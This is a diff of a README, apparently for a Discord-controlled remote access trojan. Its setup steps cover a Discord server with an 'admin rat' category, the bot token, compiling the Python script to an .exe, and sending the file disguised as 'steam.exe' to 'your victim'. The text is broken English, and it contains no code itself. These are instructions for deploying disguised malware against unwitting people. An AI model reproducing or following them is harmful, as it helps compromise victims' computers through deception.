@@ -1,3 +1,9 @@
--- to start the bot pute in logne 38 the token of your bot 
+- create a new disord serveur and create a categori named admin rat
 
--- withe the file 'ins.py' run it and tape 1 to converte tou .py file to a .exe 
+- to start the bot pute in logne 38 the token of your bot 
+
+- withe the file 'ins.py' run it and tape 1 to converte tou .py file to a .exe
+
+- send the file in the folder '' named steam.exe to your victim
+
+- to see all command you can say in a random chanel of your seveur !help
